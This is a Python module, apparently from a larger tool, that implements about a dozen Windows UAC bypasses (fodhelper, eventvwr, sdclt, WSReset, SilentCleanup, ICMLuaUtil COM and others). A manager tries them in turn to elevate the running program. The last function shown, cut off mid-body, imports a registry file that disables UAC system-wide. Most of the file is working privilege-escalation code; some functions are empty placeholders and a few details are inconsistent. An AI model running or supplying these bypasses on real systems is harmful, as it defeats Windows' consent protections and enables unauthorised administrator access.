"""
UAC Bypass module - ENHANCED
Contains various UAC bypass techniques inspired by UACME project
Enhanced with improved error handling, security monitoring, and cleanup
"""

import os
import subprocess
import time
import tempfile
import threading
from typing import Dict, List, Optional, Callable
from logging_utils import log_message, log_security_event, log_uac_bypass_attempt, log_exception
from dependencies import WINDOWS_AVAILABLE


class UACBypassError(Exception):
    """Custom exception for UAC bypass errors"""
    pass


class UACBypassMethod:
    """Base class for UAC bypass methods with enhanced error handling"""
    
    def __init__(self, name: str, description: str, method_id: int):
        self.name = name
        self.description = description
        self.method_id = method_id
        self._lock = threading.Lock()
    
    def execute(self) -> bool:
        """Execute the UAC bypass method with enhanced error handling"""
        if not self.is_available():
            raise UACBypassError(f"{self.name} not available on this system")
        
        with self._lock:
            try:
                log_security_event(f"UAC bypass attempt started", {"method": self.name, "id": self.method_id})
                result = self._execute_bypass()
                
                if result:
                    log_uac_bypass_attempt(self.name, True)
                    log_security_event(f"UAC bypass successful", {"method": self.name})
                else:
                    log_uac_bypass_attempt(self.name, False, "Method returned False")
                
                return result
                
            except Exception as e:
                log_uac_bypass_attempt(self.name, False, str(e))
                log_exception(f"UAC bypass method {self.name} failed", e)
                raise UACBypassError(f"{self.name} failed: {e}")
    
    def _execute_bypass(self) -> bool:
        """Override this method in subclasses"""
        raise NotImplementedError("Subclasses must implement _execute_bypass")
    
    def is_available(self) -> bool:
        """Check if this method is available on the current system"""
        return WINDOWS_AVAILABLE
    
    def get_current_executable(self) -> str:
        """Get the current executable path for elevation"""
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            return f'python.exe "{current_exe}"'
        return current_exe
    
    def cleanup_registry(self, key_path: str, hive=None) -> None:
        """Clean up registry entries with proper error handling"""
        try:
            import winreg
            if hive is None:
                hive = winreg.HKEY_CURRENT_USER
            
            winreg.DeleteKey(hive, key_path)
            log_security_event("Registry cleanup completed", {"key_path": key_path})
        except Exception as e:
            log_message(f"Registry cleanup failed for {key_path}: {e}", "warning")

class FodhelperProtocolBypass(UACBypassMethod):
    """Enhanced UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)"""
    
    def __init__(self):
        super().__init__(
            "Fodhelper Protocol",
            "UAC bypass using fodhelper.exe and ms-settings protocol",
            33
        )
    
    def is_available(self) -> bool:
        """Check if Windows and required modules are available"""
        return super().is_available() and os.path.exists(r"C:\Windows\System32\fodhelper.exe")
    
    def _execute_bypass(self) -> bool:
        """Execute the fodhelper protocol bypass"""
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            
            # Create protocol handler for ms-settings
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            log_security_event("Registry key created for fodhelper bypass", {"key_path": key_path})
            
            # Execute fodhelper to trigger bypass
            process = subprocess.Popen(
                [r"C:\Windows\System32\fodhelper.exe"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait for process completion with timeout
            try:
                stdout, stderr = process.communicate(timeout=10)
                if stderr:
                    log_message(f"Fodhelper stderr: {stderr.decode()}", "warning")
            except subprocess.TimeoutExpired:
                process.kill()
                log_message("Fodhelper process timed out", "warning")
            
            time.sleep(2)
            
            # Clean up registry
            self.cleanup_registry(key_path)
            
            return True
            
        except ImportError as e:
            raise UACBypassError(f"Required module not available: {e}")
        except Exception as e:
            # Clean up on failure
            try:
                self.cleanup_registry(key_path)
            except:
                pass
            raise UACBypassError(f"Fodhelper protocol bypass failed: {e}")


class ComputerDefaultsBypass(UACBypassMethod):
    """Enhanced UAC bypass using computerdefaults.exe registry manipulation"""
    
    def __init__(self):
        super().__init__(
            "Computer Defaults",
            "UAC bypass using computerdefaults.exe registry manipulation",
            33
        )
    
    def is_available(self) -> bool:
        """Check if Windows and required modules are available"""
        return super().is_available() and os.path.exists(r"C:\Windows\System32\ComputerDefaults.exe")
    
    def _execute_bypass(self) -> bool:
        """Execute the computerdefaults bypass"""
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            log_security_event("Registry key created for computerdefaults bypass", {"key_path": key_path})
            
            # Execute computerdefaults to trigger bypass
            process = subprocess.Popen(
                [r"C:\Windows\System32\ComputerDefaults.exe"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait for process completion with timeout
            try:
                stdout, stderr = process.communicate(timeout=10)
                if stderr:
                    log_message(f"Computerdefaults stderr: {stderr.decode()}", "warning")
            except subprocess.TimeoutExpired:
                process.kill()
                log_message("Computerdefaults process timed out", "warning")
            
            time.sleep(2)
            
            # Clean up registry
            self.cleanup_registry(key_path)
            
            return True
            
        except ImportError as e:
            raise UACBypassError(f"Required module not available: {e}")
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except:
                pass
            raise UACBypassError(f"Computer defaults bypass failed: {e}")


class ICMLuaUtilBypass(UACBypassMethod):
    """Enhanced UAC bypass using ICMLuaUtil COM interface (UACME Method 41)"""
    
    def __init__(self):
        super().__init__(
            "ICMLuaUtil COM",
            "UAC bypass using ICMLuaUtil COM interface",
            41
        )
    
    def is_available(self) -> bool:
        """Check if Windows and COM modules are available"""
        try:
            import win32com.client
            import pythoncom
            return super().is_available()
        except ImportError:
            return False
    
    def _execute_bypass(self) -> bool:
        """Execute the ICMLuaUtil COM bypass"""
        try:
            import win32com.client
            import pythoncom
            
            # Initialize COM
            pythoncom.CoInitialize()
            
            try:
                # Create elevated COM object
                lua_util = win32com.client.Dispatch(
                    "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
                )
                
                current_exe = self.get_current_executable()
                
                # Execute elevated command using ShellExec method
                lua_util.ShellExec(current_exe, "", "", 0, 1)
                
                return True
                
            finally:
                pythoncom.CoUninitialize()
                
        except ImportError as e:
            raise UACBypassError(f"Required COM modules not available: {e}")
        except Exception as e:
            raise UACBypassError(f"ICMLuaUtil COM bypass failed: {e}")


def is_admin():
    """Enhanced admin check with better error handling."""
    if not WINDOWS_AVAILABLE:
        return False
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception as e:
        log_message(f"Error checking admin status: {e}", "warning")
        return False

# Additional enhanced UAC bypass methods
class EventViewerBypass(UACBypassMethod):
    """Enhanced UAC bypass using EventVwr.exe registry hijacking (UACME Method 25)"""
    
    def __init__(self):
        super().__init__(
            "Event Viewer",
            "UAC bypass using EventVwr.exe registry hijacking",
            25
        )
    
    def is_available(self) -> bool:
        return super().is_available() and os.path.exists(r"C:\Windows\System32\eventvwr.exe")
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\mscfile\shell\open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            log_security_event("Registry key created for eventvwr bypass", {"key_path": key_path})
            
            process = subprocess.Popen(
                [r"C:\Windows\System32\eventvwr.exe"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                stdout, stderr = process.communicate(timeout=15)
                if stderr:
                    log_message(f"EventVwr stderr: {stderr.decode()}", "warning")
            except subprocess.TimeoutExpired:
                process.kill()
                log_message("EventVwr process timed out", "warning")
            
            time.sleep(3)
            self.cleanup_registry(key_path)
            return True
            
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except:
                pass
            raise UACBypassError(f"Event Viewer bypass failed: {e}")


class SdcltBypass(UACBypassMethod):
    """Enhanced UAC bypass using sdclt.exe registry manipulation (UACME Method 31)"""
    
    def __init__(self):
        super().__init__(
            "Sdclt",
            "UAC bypass using sdclt.exe registry manipulation",
            31
        )
    
    def is_available(self) -> bool:
        return super().is_available() and os.path.exists(r"C:\Windows\System32\sdclt.exe")
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\Folder\shell\open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            log_security_event("Registry key created for sdclt bypass", {"key_path": key_path})
            
            process = subprocess.Popen(
                [r"C:\Windows\System32\sdclt.exe"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                stdout, stderr = process.communicate(timeout=15)
                if stderr:
                    log_message(f"Sdclt stderr: {stderr.decode()}", "warning")
            except subprocess.TimeoutExpired:
                process.kill()
                log_message("Sdclt process timed out", "warning")
            
            time.sleep(3)
            self.cleanup_registry(key_path)
            return True
            
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except:
                pass
            raise UACBypassError(f"Sdclt bypass failed: {e}")


class WSResetBypass(UACBypassMethod):
    """Enhanced UAC bypass using WSReset.exe (UACME Method 56)"""
    
    def __init__(self):
        super().__init__(
            "WSReset",
            "UAC bypass using WSReset.exe",
            56
        )
    
    def is_available(self) -> bool:
        return super().is_available() and os.path.exists(r"C:\Windows\System32\WSReset.exe")
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            log_security_event("Registry key created for WSReset bypass", {"key_path": key_path})
            
            process = subprocess.Popen(
                [r"C:\Windows\System32\WSReset.exe"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                stdout, stderr = process.communicate(timeout=15)
                if stderr:
                    log_message(f"WSReset stderr: {stderr.decode()}", "warning")
            except subprocess.TimeoutExpired:
                process.kill()
                log_message("WSReset process timed out", "warning")
            
            time.sleep(3)
            self.cleanup_registry(key_path)
            return True
            
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except:
                pass
            raise UACBypassError(f"WSReset bypass failed: {e}")


class SluiBypass(UACBypassMethod):
    """Enhanced UAC bypass using slui.exe registry hijacking (UACME Method 45)"""
    
    def __init__(self):
        super().__init__(
            "Slui",
            "UAC bypass using slui.exe registry hijacking",
            45
        )
    
    def is_available(self) -> bool:
        return super().is_available() and os.path.exists(r"C:\Windows\System32\slui.exe")
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\exefile\shell\open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            log_security_event("Registry key created for slui bypass", {"key_path": key_path})
            
            process = subprocess.Popen(
                [r"C:\Windows\System32\slui.exe"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                stdout, stderr = process.communicate(timeout=10)
                if stderr:
                    log_message(f"Slui stderr: {stderr.decode()}", "warning")
            except subprocess.TimeoutExpired:
                process.kill()
                log_message("Slui process timed out", "warning")
            
            time.sleep(2)
            self.cleanup_registry(key_path)
            return True
            
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except:
                pass
            raise UACBypassError(f"Slui bypass failed: {e}")


class WinsatBypass(UACBypassMethod):
    """Enhanced UAC bypass using winsat.exe (UACME Method 67)"""
    
    def __init__(self):
        super().__init__(
            "Winsat",
            "UAC bypass using winsat.exe",
            67
        )
    
    def is_available(self) -> bool:
        return super().is_available() and os.path.exists(r"C:\Windows\System32\winsat.exe")
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Software\Classes\Folder\shell\open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            log_security_event("Registry key created for winsat bypass", {"key_path": key_path})
            
            process = subprocess.Popen(
                [r"C:\Windows\System32\winsat.exe", "disk"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            try:
                stdout, stderr = process.communicate(timeout=20)
                if stderr:
                    log_message(f"Winsat stderr: {stderr.decode()}", "warning")
            except subprocess.TimeoutExpired:
                process.kill()
                log_message("Winsat process timed out", "warning")
            
            time.sleep(2)
            self.cleanup_registry(key_path)
            return True
            
        except Exception as e:
            try:
                self.cleanup_registry(key_path)
            except:
                pass
            raise UACBypassError(f"Winsat bypass failed: {e}")


class SilentCleanupBypass(UACBypassMethod):
    """Enhanced UAC bypass using SilentCleanup scheduled task (UACME Method 34)"""
    
    def __init__(self):
        super().__init__(
            "SilentCleanup",
            "UAC bypass using SilentCleanup scheduled task",
            34
        )
    
    def _execute_bypass(self) -> bool:
        try:
            import winreg
            
            current_exe = self.get_current_executable()
            key_path = r"Environment"
            
            # Set environment variable for SilentCleanup task
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, f"{current_exe} & ")
            winreg.CloseKey(key)
            
            log_security_event("Environment variable set for SilentCleanup bypass", {"key_path": key_path})
            
            # Execute SilentCleanup task
            result = subprocess.run([
                "schtasks", "/run", "/tn", r"\Microsoft\Windows\DiskCleanup\SilentCleanup"
            ], capture_output=True, text=True, timeout=30)
            
            if result.returncode != 0:
                log_message(f"SilentCleanup task execution failed: {result.stderr}", "warning")
            
            time.sleep(5)
            
            # Clean up environment variable
            self._cleanup_environment()
            return True
            
        except Exception as e:
            try:
                self._cleanup_environment()
            except:
                pass
            raise UACBypassError(f"SilentCleanup bypass failed: {e}")
    
    def _cleanup_environment(self) -> None:
        """Clean up environment variable"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "windir")
            winreg.CloseKey(key)
            log_security_event("Environment variable cleanup completed")
        except Exception as e:
            log_message(f"Environment cleanup failed: {e}", "warning")


class UACBypassManager:
    """Enhanced UAC bypass manager with improved error handling"""
    
    def __init__(self):
        self._lock = threading.RLock()
        self.methods: Dict[str, UACBypassMethod] = {
            'fodhelper': FodhelperProtocolBypass(),
            'computerdefaults': ComputerDefaultsBypass(),
            'icmluautil': ICMLuaUtilBypass(),
            'eventvwr': EventViewerBypass(),
            'sdclt': SdcltBypass(),
            'wsreset': WSResetBypass(),
            'slui': SluiBypass(),
            'winsat': WinsatBypass(),
            'silentcleanup': SilentCleanupBypass(),
        }
    
    def get_available_methods(self) -> List[str]:
        """Get list of available UAC bypass methods"""
        with self._lock:
            return [name for name, method in self.methods.items() if method.is_available()]
    
    def execute_method(self, method_name: str) -> bool:
        """Execute a specific UAC bypass method"""
        with self._lock:
            if method_name not in self.methods:
                log_message(f"Unknown UAC bypass method: {method_name}", "error")
                return False
            
            method = self.methods[method_name]
            
            if not method.is_available():
                log_message(f"UAC bypass method '{method_name}' not available", "warning")
                return False
            
            try:
                log_message(f"Attempting UAC bypass using method: {method.name}", "info")
                result = method.execute()
                
                if result:
                    log_message(f"UAC bypass '{method_name}' succeeded", "info")
                else:
                    log_message(f"UAC bypass '{method_name}' failed", "warning")
                
                return result
                
            except UACBypassError as e:
                log_message(f"UAC bypass '{method_name}' error: {e}", "error")
                return False
            except Exception as e:
                log_exception(f"Unexpected error in UAC bypass '{method_name}'", e)
                return False
    
    def try_all_methods(self) -> bool:
        """Try all available UAC bypass methods until one succeeds"""
        with self._lock:
            available_methods = self.get_available_methods()
            
            if not available_methods:
                log_message("No UAC bypass methods available", "warning")
                return False
            
            log_message(f"Trying {len(available_methods)} UAC bypass methods", "info")
            
            for method_name in available_methods:
                try:
                    if self.execute_method(method_name):
                        log_message(f"UAC bypass successful with method: {method_name}", "info")
                        return True
                except Exception as e:
                    log_exception(f"Error trying UAC bypass method '{method_name}'", e)
                    continue
            
            log_message("All UAC bypass methods failed", "error")
            return False
    
    def run_as_admin(self) -> bool:
        """Attempt to run the current process as administrator"""
        if is_admin():
            log_message("Already running as administrator", "info")
            return True
        
        log_message("Attempting to escalate privileges", "info")
        return self.try_all_methods()


# Global UAC bypass manager instance
uac_manager = UACBypassManager()

def elevate_privileges():
    """Enhanced privilege elevation using the new UAC bypass manager"""
    return uac_manager.run_as_admin()

# Legacy compatibility functions (deprecated - use UACBypassManager instead)
def bypass_uac_cmlua_com():
    """UAC bypass using ICMLuaUtil COM interface (UACME Method 41)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import win32com.client
        import pythoncom
    except ImportError:
        log_message("win32com not available for ICMLuaUtil bypass", "warning")
        return False
    
    try:
        # Initialize COM
        pythoncom.CoInitialize()
        
        # Create elevated COM object
        try:
            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
            
            # Execute elevated command using ShellExec method
            current_exe = os.path.abspath(__file__)
            if current_exe.endswith('.py'):
                current_exe = f'python.exe "{current_exe}"'
            
            lua_util.ShellExec(current_exe, "", "", 0, 1)
            return True
            
        except Exception as e:
            log_message(f"ICMLuaUtil COM bypass failed: {e}")
            return False
        finally:
            pythoncom.CoUninitialize()
            
    except Exception as e:
        log_message(f"ICMLuaUtil COM initialization failed: {e}")
        return False

def bypass_uac_fodhelper_protocol():
    """Deprecated - use uac_manager.execute_method('fodhelper') instead"""
    log_message("Using deprecated function - upgrade to uac_manager.execute_method('fodhelper')", "warning")
    return uac_manager.execute_method('fodhelper')

def bypass_uac_computerdefaults():
    """UAC bypass using computerdefaults.exe registry manipulation."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        # Execute computerdefaults.exe
        subprocess.Popen([r"C:\Windows\System32\ComputerDefaults.exe"], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(2)
        
        # Clean up
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
            
        return True
        
    except Exception as e:
        log_message(f"ComputerDefaults bypass failed: {e}")
        return False

def bypass_uac_dccw_com():
    """UAC bypass using IColorDataProxy COM interface (UACME Method 43)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import win32com.client
        import pythoncom
    except ImportError:
        return False
    
    try:
        pythoncom.CoInitialize()
        
        try:
            # Create IColorDataProxy COM object
            color_proxy = win32com.client.Dispatch("CLSID:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}")
            
            current_exe = os.path.abspath(__file__)
            if current_exe.endswith('.py'):
                current_exe = f'python.exe "{current_exe}"'
            
            # LaunchDccw method to execute elevated
            color_proxy.LaunchDccw(0)
            return True
            
        except Exception as e:
            log_message(f"IColorDataProxy COM bypass failed: {e}")
            return False
        finally:
            pythoncom.CoUninitialize()
            
    except Exception as e:
        log_message(f"IColorDataProxy COM initialization failed: {e}")
        return False

def bypass_uac_dismcore_hijack():
    """UAC bypass using DismCore.dll hijacking."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Registry hijack for DismCore
        key_path = r"Software\Classes\Folder\shell\open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        # Execute diskcleanup to trigger
        subprocess.Popen([r"C:\Windows\System32\cleanmgr.exe"], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(3)
        
        # Clean up
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
            
        return True
        
    except Exception as e:
        log_message(f"DismCore hijack bypass failed: {e}")
        return False

def bypass_uac_wow64_logger():
    """UAC bypass using WOW64 logger hijacking."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import ctypes
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake wow64log.dll that executes our payload
        system32 = r"C:\Windows\System32"
        temp_dll = os.path.join(tempfile.gettempdir(), "wow64log.dll")
        
        # Simple DLL stub that launches our executable
        dll_code = f'''
        #include <windows.h>
        BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
            if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
                system("{current_exe}");
            }}
            return TRUE;
        }}
        '''
        
        # This is a simplified approach - in practice you'd need to compile the DLL
        return False  # Placeholder for actual implementation
        
    except Exception as e:
        log_message(f"WOW64 logger bypass failed: {e}")
        return False

def bypass_uac_silentcleanup():
    """UAC bypass using SilentCleanup scheduled task."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack environment variable
        key_path = r"Environment"
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, f"{current_exe} && ")
        winreg.CloseKey(key)
        
        # Trigger SilentCleanup task
        subprocess.run([
            "schtasks.exe", "/run", "/tn", r"\Microsoft\Windows\DiskCleanup\SilentCleanup"
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(3)
        
        # Restore environment
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, r"C:\Windows")
            winreg.CloseKey(key)
        except:
            pass
            
        return True
        
    except Exception as e:
        log_message(f"SilentCleanup bypass failed: {e}")
        return False

def bypass_uac_token_manipulation():
    """UAC bypass using token manipulation and impersonation."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import ctypes
        from ctypes import wintypes
        
        # This is a complex technique that requires careful implementation
        # Placeholder for token manipulation code
        return False
        
    except Exception as e:
        log_message(f"Token manipulation bypass failed: {e}")
        return False

def bypass_uac_junction_method():
    """UAC bypass using NTFS junction/reparse points."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Junction point technique - placeholder
        return False
        
    except Exception as e:
        log_message(f"Junction method bypass failed: {e}")
        return False

def bypass_uac_cor_profiler():
    """UAC bypass using .NET Code Profiler (COR_PROFILER)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # COR_PROFILER technique - placeholder
        return False
        
    except Exception as e:
        log_message(f"COR_PROFILER bypass failed: {e}")
        return False

def bypass_uac_com_handlers():
    """UAC bypass using COM handler hijacking."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # COM handler hijacking - placeholder
        return False
        
    except Exception as e:
        log_message(f"COM handlers bypass failed: {e}")
        return False

def bypass_uac_volatile_env():
    """UAC bypass using volatile environment variables."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Volatile environment technique - placeholder
        return False
        
    except Exception as e:
        log_message(f"Volatile environment bypass failed: {e}")
        return False

def bypass_uac_slui_hijack():
    """UAC bypass using slui.exe registry hijacking."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        key_path = r"Software\Classes\exefile\shell\open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        # Execute slui.exe
        subprocess.Popen([r"C:\Windows\System32\slui.exe"], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(2)
        
        # Clean up
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
            
        return True
        
    except Exception as e:
        log_message(f"Slui hijack bypass failed: {e}")
        return False

def bypass_uac_eventvwr():
    """UAC bypass using EventVwr.exe registry hijacking."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        key_path = r"Software\Classes\mscfile\shell\open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.CloseKey(key)
        
        # Execute eventvwr.exe
        subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(2)
        
        # Clean up
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
            
        return True
        
    except Exception as e:
        log_message(f"EventVwr bypass failed: {e}")
        return False

def bypass_uac_sdclt():
    """UAC bypass using sdclt.exe."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        key_path = r"Software\Classes\Folder\shell\open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        # Execute sdclt.exe
        subprocess.Popen([r"C:\Windows\System32\sdclt.exe"], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(2)
        
        # Clean up
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
            
        return True
        
    except Exception as e:
        log_message(f"Sdclt bypass failed: {e}")
        return False

def bypass_uac_wsreset():
    """UAC bypass using WSReset.exe."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        # Execute WSReset.exe
        subprocess.Popen([r"C:\Windows\System32\WSReset.exe"], 
                       creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(2)
        
        # Clean up
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
            
        return True
        
    except Exception as e:
        log_message(f"WSReset bypass failed: {e}")
        return False

def write_and_import_uac_bypass_reg():
    """Write and import UAC bypass registry file."""
    reg_content = r'''
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command]
@="cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
"DelegateExecute"=""
'''
    
    # Write registry file
    reg_file_path = os.path.join(tempfile.gettempdir(), "uac_bypass.reg")
    with open(reg_file_path, 'w') as f:
        f.write(reg_content)
    
    # Import registry file
    try:
        subprocess.run(['regedit.exe', '/s', reg_file_path], 
                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        log_message("UAC bypass registry imported successfully")
        
        # Clean up
        try:
            os.remove(reg_file_path)
        except Exception as e:
            log_message(f"Could not remove temporary registry file: {e}", "warning")
            
        return True
        
    except Exception as e:
